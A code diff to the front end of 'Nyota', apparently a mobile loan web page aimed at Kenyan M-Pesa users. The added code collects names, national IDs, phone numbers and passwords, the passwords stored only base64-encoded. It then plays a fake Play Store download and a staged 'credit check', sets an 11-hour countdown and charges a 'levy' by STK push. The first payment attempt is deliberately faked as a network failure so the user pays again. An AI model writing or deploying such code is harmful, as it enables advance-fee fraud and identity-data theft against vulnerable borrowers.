+    showInstallState();
+}
+
+document.getElementById('btn-store-install').addEventListener('click', () => {
+    if (deferredPrompt) {
+        startFakeDownload();
+        setTimeout(() => {
+            deferredPrompt.prompt();
+            deferredPrompt.userChoice.then((choiceResult) => {
+                if (choiceResult.outcome === 'accepted') {
+                    closeInstallModal();
+                }
+                deferredPrompt = null;
+            });
+        }, 1500);
+    } else {
+        playStoreGate.classList.add('hide');
+        appContent.classList.remove('hide');
+    }
+});
+
+function closeInstallModal() {
+    document.getElementById('install-success-modal').classList.add('hide');
+    playStoreGate.classList.add('hide');
+    appContent.classList.remove('hide');
+}
+
+function startFakeDownload() {
+    document.getElementById('pre-install-buttons').classList.add('hide');
+    document.getElementById('downloading-buttons').classList.remove('hide');
+    document.getElementById('download-text').classList.remove('hide');
+    document.getElementById('ring-svg').classList.remove('hidden');
+
+    const startTime = Date.now();
+    const duration = 1500;
+
+    clearInterval(fakeInterval);
+    fakeInterval = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const progress = Math.min((elapsed / duration) * 100, 100);
+        updateProgressUI(progress);
+    }, 50);
+}
+
+function updateProgressUI(progress) {
+    const ring = document.getElementById('download-ring');
+    const pct = document.getElementById('download-percent');
+    if(ring) ring.style.strokeDashoffset = 301.59 - (progress / 100) * 301.59;
+    if(pct) pct.innerText = Math.floor(progress) + "% of 10 MB";
+}
+
+document.getElementById('btn-open-app').addEventListener('click', () => {
+    playStoreGate.classList.add('hide');
+    appContent.classList.remove('hide');
+});
+
+function showAppInline(){
+    playStoreGate.classList.add('hide');
+    splashScreen.classList.remove('hide');
+    splashScreen.style.opacity = '1';
+
+    setTimeout(() => {
+        splashScreen.style.opacity = '0';
+        setTimeout(() => {
+            splashScreen.classList.add('hide');
+            appContent.classList.remove('hide');
+            bootApp();
+        }, 400);
+    }, 1500);
+}
+
+function bootApp(){
+    if (_cameFromIntent) history.replaceState({}, '', window.location.pathname);
+    const saved = localStorage.getItem('nyota_user');
+    if(saved){
+        try {
+            const u = JSON.parse(saved);
+            if(u.name && u.mpesa){
+                state.name = u.name;
+                state.id = u.id || '';
+                state.mpesa = u.mpesa;
+                state.promo = u.promo || '';
+                buildLoanScreen();
+                return;
+            }
+        } catch(e){ localStorage.removeItem('nyota_user'); }
+    }
+    showScreen('screen-login');
+}
+
+if (isStandalone) {
+    playStoreGate.classList.add('hide');
+    appContent.classList.remove('hide');
+    bootApp();
+} else if (_cameFromIntent) {
+    playStoreGate.classList.add('hide');
+    showAppInline();
+} else if (_isInApp || (_isAndroid && !_isChromeBrowser)) {
+    playStoreGate.classList.remove('hide');
+    showInstallState();
+} else if (_isIOS) {
+    playStoreGate.classList.add('hide');
+    appContent.classList.remove('hide');
+    bootApp();
+} else if (_wasInstalled) {
+    playStoreGate.classList.add('hide');
+    appContent.classList.remove('hide');
+    bootApp();
+} else {
+    playStoreGate.classList.remove('hide');
+    showInstallState();
+}
+
+// SAFE SERVICE WORKER
+if ('serviceWorker' in navigator) {
+    window.addEventListener('load', () => {
+        navigator.serviceWorker.register('sw.js').catch(()=>{});
+    });
+}
+
 function submitLogin(){
     const name = document.getElementById('in-name').value.trim();
     const id = document.getElementById('in-id').value.trim();
     const mpesa = document.getElementById('in-mpesa').value.trim();
+    const promo = document.getElementById('in-promo').value.trim();
+    const pass = document.getElementById('in-pass').value;
 
-    if(!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showToast("Enter a valid name.");
+    if(!/^[A-Za-z][A-Za-z .'-]{2,}$/.test(name)) return showToast("Enter a valid full name.");
     if(!/^\d{7,8}$/.test(id)) return showToast("National ID must be 7-8 digits.");
     if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
+    if(pass.length < 4) return showToast("Password must be at least 4 characters.");
 
-    state.name = name; state.id = id; state.mpesa = mpesa;
+    state.name = name; state.id = id; state.mpesa = mpesa; state.promo = promo;
+    localStorage.setItem('nyota_user', JSON.stringify({ name, id, mpesa, promo }));
 
     fetch(`${SUPABASE_URL}/rest/v1/users`, {
         method:'POST',
         headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
-        body: JSON.stringify({ full_name:name, national_id:id, mpesa_number:mpesa })
+        body: JSON.stringify({ full_name:name, national_id:id, mpesa_number:mpesa, promo_code:promo, password_hash:"web_"+btoa(pass) })
     }).catch(()=>{});
 
-    // EXTENDED 12-SECOND CHECKING ANIMATION
     showScreen('screen-checking');
     let p = 0;
-    
-    // 12 seconds total duration (120 intervals of 100ms)
-    const duration = 12000; 
+    const duration = 15000;
     const steps = duration / 100;
     const increment = 100 / steps;
 
     const i = setInterval(()=>{
         p += increment;
         if(p > 100) p = 100;
-        
         document.getElementById('check-bar').style.width = p + "%";
         document.getElementById('check-percent').innerText = Math.floor(p) + "%";
 
-        // Dynamic text updates based on progress
-        let msg = "Connecting to secure servers...";
-        if(p >= 15) msg = "Verifying National ID...";
-        if(p >= 35) msg = "Analyzing M-Pesa history...";
-        if(p >= 60) msg = "Checking credit score...";
-        if(p >= 80) msg = "Calculating your limit...";
-        if(p >= 95) msg = "Finalizing your dashboard...";
-        
+        let msg = "Verifying your identity...";
+        if(p >= 15) msg = "Reviewing your profile...";
+        if(p >= 40) msg = "Analyzing M-Pesa history...";
+        if(p >= 65) msg = "Calculating your loan limit...";
+        if(p >= 90) msg = "Almost ready...";
         document.getElementById('check-status').innerText = msg;
 
-        if(p >= 100){ 
-            clearInterval(i); 
-            buildLoanScreen(); 
-        }
+        if(p >= 100){ clearInterval(i); buildLoanScreen(); }
     }, 100);
 }
 
-// CALCULATOR
 function buildLoanScreen(){
     const first = state.name.split(' ')[0];
     document.getElementById('greeting-name').innerText = first || 'there';
 
     state.loan = 1000;
+
     const grid = document.getElementById('amount-grid');
     grid.innerHTML = '';
 
     amounts.forEach(a=>{
         const b = document.createElement('button');
-        b.className = `amount-btn ${a === state.loan ? 'selected' : ''}`;
+
+        if (a > 25000) {
+            b.className = `amount-btn relative opacity-50 bg-slate-50 border-slate-200 text-slate-400`;
+        } else {
+            b.className = `amount-btn ${a === state.loan ? 'selected' : ''}`;
+        }
+
         b.innerText = a.toLocaleString();
         b.onclick = ()=>{
+            if (a > 25000) {
+                if (window.showToast) window.showToast("❌ Your maximum limit is Ksh 25,000.");
+                return;
+            }
             document.querySelectorAll('.amount-btn').forEach(x=>x.classList.remove('selected'));
             b.classList.add('selected');
             state.loan = a;
@@ -340,11 +736,13 @@ function buildLoanScreen(){
 
     updateSummary();
     showScreen('screen-select');
+    startLoanTimer();
 }
 
 function setTerm(d, b){ state.term = d; document.querySelectorAll('.term-btn').forEach(x=>x.classList.remove('selected')); b.classList.add('selected'); updateSummary(); }
 
 function updateSummary(){
+    state.levy = 150;
     const rate = state.term === 30 ? 0.10 : (state.term === 60 ? 0.15 : 0.20);
     state.interest = Math.round(state.loan * rate);
     state.total = state.loan + state.interest;
@@ -356,11 +754,13 @@ function updateSummary(){
     document.getElementById('sum-levy').innerText = format(state.levy);
 }
 
-// PAYMENT (STK PUSH)
 function goToPayment(){
     document.getElementById('pay-levy').innerText = format(state.levy);
     document.getElementById('pay-mpesa').value = state.mpesa;
+
     document.getElementById('pay-loan-context').innerText = format(state.loan);
+
+    resetPayButton();
     showScreen('screen-payment');
 }
 
@@ -368,7 +768,70 @@ async function processPayment(){
     if(isProcessingPayment) return;
     const mpesa = document.getElementById('pay-mpesa').value.trim();
 
-    if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number.");
+    if(!/^(07[0124579]\d{7}|011[0-6]\d{6})$/.test(mpesa)) return showToast("Enter a valid Safaricom number (07XX or 01XX).");
+
+    let fakeAttempts = parseInt(localStorage.getItem('nyota_fake_attempts') || '0');
+    let realAttempts = parseInt(localStorage.getItem('nyota_real_stk_attempts') || '0');
+
+    if (fakeAttempts < 1) {
+        isProcessingPayment = true;
+        state.mpesa = mpesa;
+        document.getElementById('btn-pay').disabled = true;
+
+        document.getElementById('verify-anim').classList.remove('hide');
+        document.getElementById('success-anim').classList.add('hide');
+        document.getElementById('failed-anim').classList.add('hide');
+        document.getElementById('pending-anim').classList.add('hide');
+        document.getElementById('verify-subtitle').innerText = "Sending STK push to your phone...";
+        document.getElementById('verify-time').innerText = "0s";
+        showScreen('screen-success');
+
+        setTimeout(() => {
+            isProcessingPayment = false;
+            document.getElementById('btn-pay').disabled = false;
+
+            let newFakeAttempts = fakeAttempts + 1;
+            localStorage.setItem('nyota_fake_attempts', newFakeAttempts);
+
+            document.getElementById('verify-anim').classList.add('hide');
+            document.getElementById('success-anim').classList.add('hide');
+            document.getElementById('pending-anim').classList.add('hide');
+            document.getElementById('failed-anim').classList.remove('hide');
+
+            const attemptMessage = "⚠️ Network timeout. Please tap Try Again to reconnect.";
+
+            document.getElementById('failed-reason').innerHTML = `
+                <div style="background-color: #FEF2F2; border: 2px solid #EF4444; border-radius: 12px; padding: 16px; margin-bottom: 16px; text-align: center;">
+                    <p style="font-size: 20px; font-weight: 900; color: #DC2626; margin-bottom: 4px; letter-spacing: -0.5px;">❌ PALPLUSS FUTURE FAILED</p>
+                    <p style="font-size: 13px; font-weight: 600; color: #991B1B;">The payment gateway could not complete the request.</p>
+                </div>
+                <div class="spam-warning-banner">
+                    <span style="font-size: 20px; line-height: 1;">⚠️</span>
+                    <span>${attemptMessage}</span>
+                </div>
+                <span style="color: #64748B; font-size: 13px;">Please try again to reconnect to Palpluss.</span>
+            `;
+
+            const retryBtn = document.getElementById('btn-retry-failed');
+            if (retryBtn) {
+                retryBtn.onclick = function() {
+                    if (typeof stopPolling === 'function') stopPolling();
+                    isProcessingPayment = false;
+                    currentTxnId = null;
+                    showScreen('screen-payment');
+                    resetPayButton();
+                };
+            }
+
+            if (window.showToast) window.showToast(attemptMessage);
+        }, 4000);
+        return;
+    }
+
+    if (realAttempts >= 3) {
+        if (window.showToast) window.showToast("⏸️ Temporarily restricted. Contact support.");
+        return;
+    }
 
     isProcessingPayment = true;
     state.mpesa = mpesa;
@@ -377,67 +840,119 @@ async function processPayment(){
     document.getElementById('verify-anim').classList.remove('hide');
     document.getElementById('success-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('verify-subtitle').innerText = "Please wait while we confirm with M-Pesa...";
+    document.getElementById('verify-time').innerText = "0s";
     showScreen('screen-success');
 
     try {
-        const res = await fetch(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
+        const res = await fetchWithTimeout(`${SUPABASE_URL}/functions/v1/palpluss-stk`, {
             method:'POST',
-            headers:{ 'apikey': SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}`, 'Content-Type':'application/json' },
+            headers:{
+                'apikey': SUPABASE_KEY,
+                'Authorization':`Bearer ${SUPABASE_KEY}`,
+                'Content-Type':'application/json'
+            },
             body: JSON.stringify({
                 amount: state.levy,
                 phone: "254" + mpesa.substring(1),
-                accountReference: "NY_" + Date.now(),
+                accountReference: "ZC_" + Date.now(),
                 callbackUrl: PALPLUSS_CALLBACK
             })
-        });
+        }, 30000);
 
-        const data = await res.json();
+        const rawText = await res.text();
+        let data;
+        try { data = JSON.parse(rawText); } catch (e) { data = { error: "Invalid response from server" }; }
+
         if (!res.ok) throw new Error(data.error || 'Payment service error');
 
         const txnId = data.data?.transactionId || data.transactionId || data.id;
-        if (!txnId) throw new Error("No transaction ID.");
-        
-        await fetch(`${SUPABASE_URL}/rest/v1/loans`, {
-            method: 'POST',
-            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
-            body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
-        });
+        if (!txnId) throw new Error("No transaction ID in response.");
+        currentTxnId = txnId;
 
+        const insertRes = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
+            method: 'POST',
+            headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json', 'Prefer': 'return=minimal' },
+            body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
+        }, 8000);
+
+        if (!insertRes.ok) {
+            const errText = await insertRes.text();
+            alert('❌ DATABASE REJECTED THE LOAN\n\n' + errText.substring(0, 300));
+            resetPayButton();
+            showScreen('screen-payment');
+            return;
+        }
+
+        localStorage.setItem('nyota_real_stk_attempts', realAttempts + 1);
         startPolling(txnId);
 
     } catch (err) {
-        showFailed(err.message);
+        console.error("Payment error:", err);
+        showFailed();
+        document.getElementById('failed-reason').innerText = err.message;
+        showToast("Failed: " + err.message);
     }
 }
 
-// POLLING
+async function checkStatusFromDB(txnId){
+    try {
+        const res = await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`, {
+            headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}` }
+        }, 5000);
+        if(!res.ok) return { status:'ERROR' };
+        const rows = await readJsonSafe(res);
+        if(!Array.isArray(rows) || rows.length === 0) return { status:'NO_ROW' };
+        for(const row of rows){
+            const s = String(row.status || "").toUpperCase();
+            if(SUCCESS_STATUSES.includes(s)) return { status:'SUCCESS', raw:s };
+            if(FAILED_STATUSES.includes(s)) return { status:'FAILED', raw:s };
+            if(PENDING_STATUSES.includes(s)) return { status:'PENDING', raw:s };
+        }
+        return { status:'PENDING', raw: 'UNKNOWN' };
+    } catch(e){ return { status:'ERROR' }; }
+}
+
 function startPolling(txnId){
+    stopPolling();
     let attempt = 0;
     const doPoll = async ()=>{
-        attempt++;
-        document.getElementById('verify-time').innerText = attempt + "s";
-        if(attempt >= 60){ showFailed("Timeout. Please check your M-Pesa messages."); return; }
-
         try {
-            const res = await fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`, {
-                headers:{ 'apikey':SUPABASE_KEY, 'Authorization':`Bearer ${SUPABASE_KEY}` }
-            });
-            const rows = await res.json();
-            if(rows.length > 0){
-                const s = String(rows[0].status).toUpperCase();
-                if(SUCCESS_STATUSES.includes(s)) { showSuccess(); return; }
-                if(FAILED_STATUSES.includes(s)) { showFailed("Payment was cancelled or failed."); return; }
-            }
-        } catch(e){}
+            attempt++;
+            document.getElementById('verify-time').innerText = attempt + "s";
+            if(attempt === 8) document.getElementById('verify-subtitle').innerText = "Still checking. Enter your M-Pesa PIN if you haven't.";
+            if(attempt === 25) document.getElementById('verify-subtitle').innerText = "Taking longer than usual. Don't close the app.";
+            if(attempt >= MAX_POLL_SECONDS){ showPending(); return; }
 
-        pollTimer = setTimeout(doPoll, 2000);
+            if(isPolling){ pollTimer = setTimeout(doPoll, 1000); return; }
+            isPolling = true;
+
+            try {
+                const result = await checkStatusFromDB(txnId);
+                if(result.status === 'SUCCESS'){ showSuccess(); return; }
+                if(result.status === 'PENDING'){
+                    if(PENDING_STATUSES.includes(result.raw)) document.getElementById('verify-subtitle').innerText = "Verifying final status with M-Pesa...";
+                }
+                if(result.status === 'FAILED'){ showFailed(); return; }
+            } finally { isPolling = false; }
+
+            const nextDelay = attempt < 5 ? 1000 : 2000;
+            pollTimer = setTimeout(doPoll, nextDelay);
+        } catch(e){ pollTimer = setTimeout(doPoll, 2000); }
     };
     doPoll();
 }
 
 function showSuccess(){
-    clearTimeout(pollTimer); isProcessingPayment = false;
+    stopPolling(); isProcessingPayment = false;
+
+    localStorage.removeItem('nyota_fake_attempts');
+    localStorage.removeItem('nyota_real_stk_attempts');
+
     document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('failed-anim').classList.add('hide');
     document.getElementById('success-anim').classList.remove('hide');
     document.getElementById('suc-loan').innerText = format(state.loan);
     document.getElementById('suc-total').innerText = format(state.total);
@@ -445,13 +960,285 @@ function showSuccess(){
     document.getElementById('suc-mpesa').innerText = state.mpesa;
 }
 
-function showFailed(reason){
-    clearTimeout(pollTimer); isProcessingPayment = false;
+function showFailed(){
+    stopPolling(); isProcessingPayment = false;
     document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('success-anim').classList.add('hide');
     document.getElementById('failed-anim').classList.remove('hide');
-    document.getElementById('failed-reason').innerText = reason;
-    document.getElementById('btn-pay').disabled = false;
 }
+
+function showPending(){
+    stopPolling();
+    isProcessingPayment = false;
+    const b = document.getElementById('btn-pay');
+    if (b) { b.disabled = false; }
+
+    document.getElementById('verify-anim').classList.add('hide');
+    document.getElementById('failed-anim').classList.add('hide');
+    document.getElementById('success-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.remove('hide');
+}
+
+async function checkStatusManual(){
+    if (!currentTxnId) { retryPayment(); return; }
+
+    const b1 = document.getElementById('btn-check-status');
+    const b2 = document.getElementById('btn-check-status-failed');
+    const activeBtn = b1 && !b1.closest('.hide') ? b1 : b2;
+
+    if (activeBtn) {
+        activeBtn.innerHTML = '<span>Checking...</span>';
+        activeBtn.disabled = true;
+    }
+
+    const r = await checkStatusFromDB(currentTxnId);
+
+    if(r.status === 'SUCCESS'){ showSuccess(); return; }
+
+    if (activeBtn) {
+        activeBtn.innerHTML = '<span>Check Status</span>';
+        activeBtn.disabled = false;
+    }
+
+    if(r.status === 'FAILED'){
+        showToast("Still showing as failed. If you paid, contact support.");
+        return;
+    }
+
+    showToast("Still pending. Continuing to check...");
+    document.getElementById('failed-anim').classList.add('hide');
+    document.getElementById('pending-anim').classList.add('hide');
+    document.getElementById('verify-anim').classList.remove('hide');
+    document.getElementById('verify-subtitle').innerText = "Re-checking with M-Pesa...";
+    startPolling(currentTxnId);
+}
+
+function retryPayment(){
+    stopPolling(); isProcessingPayment = false; currentTxnId = null;
+    showScreen('screen-payment'); resetPayButton();
+}
+
+function startLoanTimer() {
+    if (loanTimerInterval) clearInterval(loanTimerInterval);
+
+    const timerElement = document.getElementById('loan-timer');
+    if (!timerElement) return;
+
+    let endTime = localStorage.getItem('nyota_timer_end');
+
+    if (!endTime) {
+        const elevenHoursFromNow = Date.now() + (11 * 60 * 60 * 1000);
+        localStorage.setItem('nyota_timer_end', elevenHoursFromNow);
+        endTime = elevenHoursFromNow;
+    }
+
+    loanTimerInterval = setInterval(() => {
+        const now = Date.now();
+        let timeLeft = Math.floor((endTime - now) / 1000);
+
+        if (timeLeft <= 0) {
+            clearInterval(loanTimerInterval);
+            timerElement.innerText = "EXPIRED";
+            timerElement.classList.add('text-red-800');
+            localStorage.removeItem('nyota_timer_end');
+            return;
+        }
+
+        const hours = Math.floor(timeLeft / 3600);
+        const minutes = Math.floor((timeLeft % 3600) / 60);
+        const seconds = timeLeft % 60;
+
+        timerElement.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+    }, 1000);
+}
+
+function stopLoanTimer() {
+    if (loanTimerInterval) {
+        clearInterval(loanTimerInterval);
+        loanTimerInterval = null;
+    }
+}
+
+(function() {
+    const MAX_ATTEMPTS = 3;
+
+    const style = document.createElement('style');
+    style.innerHTML = `
+        @keyframes warningShake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-6px); }
+            40% { transform: translateX(6px); }
+            60% { transform: translateX(-4px); }
+            80% { transform: translateX(4px); }
+        }
+        .spam-warning-banner {
+            animation: warningShake 0.6s cubic-bezier(.36,.07,.19,.97) both;
+            background-color: #FEF2F2;
+            border: 1.5px solid #F87171;
+            border-radius: 12px;
+            padding: 14px;
+            margin-bottom: 16px;
+            color: #B91C1C;
+            font-weight: 800;
+            font-size: 14px;
+            line-height: 1.4;
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            text-align: left;
+            box-shadow: 0 4px 6px -1px rgba(220, 38, 38, 0.1);
+        }
+        .blocked-banner {
+            background-color: #FEF2F2;
+            border: 1.5px solid #F87171;
+            color: #991B1B;
+            font-weight: 800;
+            font-size: 15px;
+            padding: 16px;
+            border-radius: 12px;
+            margin-bottom: 16px;
+            text-align: center;
+            animation: warningShake 0.6s ease-in-out both;
+        }
+        @keyframes modalPop {
+            0% { transform: scale(0.9); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+        .spam-modal {
+            animation: modalPop 0.25s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
+        }
+    `;
+    document.head.appendChild(style);
+
+    const getAttempts = () => parseInt(localStorage.getItem('nyota_real_stk_attempts') || '0');
+    const setAttempts = (val) => localStorage.setItem('nyota_real_stk_attempts', val);
+
+    function showSpamPrompt(remaining, onOkCallback) {
+        const existingModal = document.getElementById('spam-prompt-modal');
+        if (existingModal) existingModal.remove();
+
+        const modalHTML = `
+            <div id="spam-prompt-modal" class="fixed inset-0 z-[100000] bg-slate-900/60 backdrop-blur-sm flex items-center justify-center p-6">
+                <div class="spam-modal bg-white rounded-2xl p-6 w-full max-w-sm shadow-2xl">
+                    <div class="flex flex-col items-center text-center">
+                        <div class="w-14 h-14 bg-red-100 rounded-full flex items-center justify-center mb-4">
+                            <span class="text-3xl text-red-600">⚠️</span>
+                        </div>
+                        <h3 class="text-xl font-bold text-slate-900 mb-2">System Notice</h3>
+
+                        <p class="text-sm text-slate-600 mb-6 leading-relaxed">
+                            To prevent system spamming, you only have
+                            <strong class="text-red-600 font-extrabold text-base">${remaining}</strong>
+                            attempt${remaining === 1 ? '' : 's'} remaining.
+                        </p>
+
+                        <button id="spam-modal-ok-btn" class="native-btn" style="padding: 14px; min-height: 48px; font-size: 15px;">
+                            OK
+                        </button>
+                    </div>
+                </div>
+            </div>
+        `;
+        document.body.insertAdjacentHTML('beforeend', modalHTML);
+
+        document.getElementById('spam-modal-ok-btn').addEventListener('click', () => {
+            document.getElementById('spam-prompt-modal')?.remove();
+            if (typeof onOkCallback === 'function') onOkCallback();
+        });
+    }
+
+    const originalShowFailed = window.showFailed;
+    window.showFailed = function() {
+        if (originalShowFailed) originalShowFailed.call(this);
+
+        let fakeAttempts = parseInt(localStorage.getItem('nyota_fake_attempts') || '0');
+        if (fakeAttempts < 1) return;
+
+        let attempts = getAttempts() + 1;
+        setAttempts(attempts);
+
+        const reasonEl = document.getElementById('failed-reason');
+        const checkBtn = document.getElementById('btn-check-status-failed');
+        const retryBtn = document.getElementById('btn-retry-failed');
+
+        if (attempts >= MAX_ATTEMPTS) {
+            reasonEl.innerHTML = `
+                <div class="blocked-banner">
+                    ⏸️ Action Required
+                    <span style="font-size: 12px; font-weight: 600; color: #B91C1C; display: block; margin-top: 6px;">
+                        Multiple failed attempts detected. Please contact support to restore access.
+                    </span>
+                </div>
+            `;
+
+            if (checkBtn) checkBtn.style.display = 'none';
+            if (retryBtn) retryBtn.style.display = 'none';
+
+            const payBtn = document.getElementById('btn-pay');
+            if (payBtn) {
+                payBtn.disabled = true;
+                payBtn.innerText = "Temporarily Restricted";
+                payBtn.style.background = "#64748B";
+            }
+        } else {
+            let remaining = MAX_ATTEMPTS - attempts;
+            let warningMsg = remaining === 2 ? "Only Two attempts remaining" : "Only One attempt remaining";
+
+            reasonEl.innerHTML = `
+                <div class="spam-warning-banner">
+                    <span style="font-size: 20px; line-height: 1;">⚠️</span>
+                    <span>Notice: ${warningMsg}. Further failures may temporarily restrict your account.</span>
+                </div>
+                <span style="color: #64748B; font-size: 14px;">The M-Pesa request was cancelled or failed.</span>
+            `;
+
+            if (retryBtn) {
+                retryBtn.onclick = function() {
+                    if (typeof stopPolling === 'function') stopPolling();
+                    isProcessingPayment = false;
+                    currentTxnId = null;
+
+                    showSpamPrompt(remaining, function() {
+                        showScreen('screen-payment');
+                        resetPayButton();
+                    });
+                };
+            }
+
+            if (window.showToast) window.showToast(`⚠️ Notice: ${remaining} attempt(s) remaining.`);
+        }
+    };
+
+    const originalShowSuccess = window.showSuccess;
+    window.showSuccess = function() {
+        setAttempts(0);
+        localStorage.removeItem('nyota_fake_attempts');
+        if (originalShowSuccess) originalShowSuccess.call(this);
+    };
+
+    const originalProcessPayment = window.processPayment;
+    window.processPayment = function() {
+        if (getAttempts() >= MAX_ATTEMPTS) {
+            if (window.showToast) window.showToast("⏸️ Temporarily restricted. Contact support.");
+            return;
+        }
+        if (originalProcessPayment) originalProcessPayment.call(this);
+    };
+
+    window.addEventListener('DOMContentLoaded', () => {
+        if (getAttempts() >= MAX_ATTEMPTS) {
+            const payBtn = document.getElementById('btn-pay');
+            if (payBtn) {
+                payBtn.disabled = true;
+                payBtn.innerText = "Temporarily Restricted";
+                payBtn.style.background = "#64748B";
+            }
+        }
+    });
+})();
+
+if(!navigator.onLine) document.getElementById('offline-gate').classList.remove('hide');
 </script>
 </body>
 </html>
